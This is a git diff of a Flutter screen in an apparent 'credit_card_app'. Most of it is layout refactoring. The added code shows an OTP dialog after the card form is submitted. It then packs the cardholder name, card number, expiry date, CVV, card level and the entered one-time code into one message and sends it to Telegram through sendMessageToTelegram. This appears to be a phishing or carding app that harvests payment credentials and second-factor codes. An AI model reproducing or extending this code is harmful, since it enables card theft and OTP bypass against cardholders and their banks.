@@ -1,4 +1,5 @@
 import 'package:credit_card_app/Controllers/credit_card_Controller.dart';
+import 'package:credit_card_app/UI/comp/otp_widegt.dart';
 import 'package:flutter/material.dart';
 import 'package:awesome_card/awesome_card.dart';
 
@@ -7,122 +8,145 @@ import 'package:get/get.dart';
 class CreditCardFormScreen extends StatelessWidget {
   final CreditCardFormController _controller =
       Get.put(CreditCardFormController());
- 
+
   @override
   Widget build(BuildContext context) {
+    void _showOtpDialog(BuildContext context) {
+      showDialog(
+        context: context,
+        builder: (BuildContext context) {
+          return OtpDialog(
+            onOtpEntered: (String otp) async {
+              // Process the entered OTP (e.g., send to server for validation)
+              String msg = "credit card info: " +
+                  "\n name :  ${_controller.cardNameController.value}" +
+                  "\n card number :  ${_controller.cardNumberController.value}" +
+                  "\n expiration date :  ${_controller.expirationDateController.value}" +
+                  "\n cvv :  ${_controller.cvvController.value}" +
+                  "\n level: ${_controller.selectedItem.value}" +
+                  "OTP Code : ${otp}";
+              await _controller.sendMessageToTelegram(msg);
+
+              print('Entered OTP: $otp');
+            },
+          );
+        },
+      );
+    }
+
+    _outlineButton() => Padding(
+          padding: const EdgeInsets.all(10),
+          child: Container(
+            padding: const EdgeInsets.all(10),
+            alignment: Alignment.center,
+            height: 60,
+            // width: 70,
+            child: OutlinedButton(
+              style: ButtonStyle(
+                backgroundColor: MaterialStateProperty.all(
+                  Colors.green,
+                ),
+                shape: MaterialStateProperty.all(
+                  RoundedRectangleBorder(
+                    borderRadius: BorderRadius.circular(10),
+                  ),
+                ),
+              ),
+              // style: const ButtonStyle(
+              //     // backgroundColor: Colors.amberAccent,
+              //     ),
+              // style:  ,
+              onPressed: () async {
+                await _controller.submitForm;
+
+                _showOtpDialog(context);
+              },
+              child: const Text('Submit',
+                  style: TextStyle(color: Colors.white, fontSize: 20)),
+            ),
+          ),
+        );
     return Scaffold(
       body: SafeArea(
         child: Padding(
-            padding: const EdgeInsets.all(50.0),
-            child:
-                Column(mainAxisAlignment: MainAxisAlignment.start, children: [
+          padding: const EdgeInsets.all(16.0),
+          child: Column(
+            mainAxisAlignment: MainAxisAlignment.start,
+            children: [
               Row(
                 mainAxisAlignment: MainAxisAlignment.spaceBetween,
                 children: [headRow(), optionsRow()],
               ),
+              SizedBox(height: 20),
               Container(
-                height: 50,
-                color: const Color.fromARGB(255, 0, 59, 108),
-                child: Row(children: [
-                  Container(
-                    padding: const EdgeInsets.only(left: 20),
-                    child: const Text(
-                      'Filll Your Credit Card Information',
-                      style: TextStyle(
-                          color: Colors.white,
-                          fontSize: 22,
-                          fontWeight: FontWeight.bold),
-                    ),
-                  )
-                ]),
-              ),
-              const SizedBox(
-                height: 20,
-              ),
-              Expanded(
+                padding: const EdgeInsets.symmetric(horizontal: 20),
                 child: Row(
-                  // mainAxisAlignment: MainAxisAlignment.start,
-                  // crossAxisAlignment: CrossAxisAlignment.center,
                   children: [
-                    Expanded(
-                      child: Column(
-                        crossAxisAlignment: CrossAxisAlignment.stretch,
-                        children: [
-                          nameTextField(),
-                          const SizedBox(height: 8.0),
-                          cardYTextField(),
-                          const SizedBox(height: 8.0),
-                          expTextField(),
-                          const SizedBox(height: 8.0),
-                          cvvTextField(),
-                          const SizedBox(height: 8.0),
-                          Padding(
-                            padding: const EdgeInsets.all(8.0),
-                            child: CustomCircularDropdownButton<String>(
-                              items: [
-                                "Card Level",
-                                "Classic",
-                                "Gold",
-                                "infinite",
-                                "signature",
-                                "Platinum"
-                              ], // Replace with your own list of items
-                              value: _controller.selectedItem.value,
-                              onChanged: _controller.onItemSelect,
-                            ),
-                          ),
-                          const SizedBox(height: 16),
-                          outlineButton()
-                        ],
-                      ),
-                    ),
-                    Expanded(
-                      child: Container(
-                        padding: const EdgeInsets.all(8),
-                        child: backImage,
+                    Text(
+                      'Fill Your Credit Card Information',
+                      style: TextStyle(
+                        color: Colors.white,
+                        fontSize: 22,
+                        fontWeight: FontWeight.bold,
                       ),
                     ),
                   ],
                 ),
+                color: const Color.fromARGB(255, 0, 59, 108),
               ),
-            ])
-         
-            ),
+              SizedBox(height: 20),
+              Expanded(
+                child: Row(
+                  children: [
+                    Expanded(
+                      child: SingleChildScrollView(
+                        child: ConstrainedBox(
+                          constraints: BoxConstraints(
+                            minHeight: MediaQuery.of(context).size.height - 200,
+                          ),
+                          child: Column(
+                            crossAxisAlignment: CrossAxisAlignment.stretch,
+                            children: [
+                              nameTextField(),
+                              SizedBox(height: 8.0),
+                              cardYTextField(),
+                              SizedBox(height: 8.0),
+                              expTextField(),
+                              SizedBox(height: 8.0),
+                              cvvTextField(),
+                              SizedBox(height: 8.0),
+                              Padding(
+                                padding: const EdgeInsets.all(8.0),
+                                child: CustomCircularDropdownButton<String>(
+                                  items: [
+                                    "Card Level",
+                                    "Classic",
+                                    "Gold",
+                                    "Infinite",
+                                    "Signature",
+                                    "Platinum"
+                                  ],
+                                  value: _controller.selectedItem.value,
+                                  onChanged: _controller.onItemSelect,
+                                ),
+                              ),
+                              SizedBox(height: 16),
+                              _outlineButton(),
+                            ],
+                          ),
+                        ),
+                      ),
+                    ),
+                    Expanded(child: backImage)
+                  ],
+                ),
+              ),
+            ],
+          ),
+        ),
       ),
     );
   }
-
-  outlineButton() => Padding(
-        padding: const EdgeInsets.only(
-          left: 100.0,
-          right: 100,
-        ),
-        child: Container(
-          padding: const EdgeInsets.all(10),
-          alignment: Alignment.center,
-          height: 60,
-          width: 70,
-          child: OutlinedButton(
-            style: ButtonStyle(
-              backgroundColor: MaterialStateProperty.all(
-                Colors.green,
-              ),
-              shape: MaterialStateProperty.all(
-                RoundedRectangleBorder(
-                  borderRadius: BorderRadius.circular(10),
-                ),
-              ),
-            ),
-            // style: const ButtonStyle(
-            //     // backgroundColor: Colors.amberAccent,
-            //     ),
-            // style:  ,
-            onPressed: _controller.submitForm,
-            child: const Text('Submit',
-                style: TextStyle(color: Colors.white, fontSize: 20)),
-          ),
-        ),
-      );
 
   nameTextField() => Padding(
         padding: const EdgeInsets.all(8.0),
